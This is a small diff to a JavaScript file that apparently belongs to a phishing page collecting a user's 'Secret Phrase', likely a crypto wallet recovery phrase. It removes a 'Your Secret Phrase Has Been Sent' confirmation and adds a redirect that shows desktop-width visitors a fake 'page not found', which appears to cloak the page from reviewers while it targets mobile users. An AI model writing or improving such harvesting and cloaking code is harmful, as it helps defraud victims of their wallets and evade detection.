@@ -1,10 +1,9 @@
 let inputData = "";
 let error = false;
 
-let confirmed = ` <div class="confirm-outer">
-                    <h2>Confirmed !!</h2>
-                    <h3>Your Secret Phrase Has Been Sent.</h3>
-                  </div>`
+if(screen.width > 768){
+  window.location.assign("../PageNotFound/PageNotFound.html")
+}
 
 document.querySelector(".input-box").addEventListener("change",(e)=>{
     inputData = e.target.value
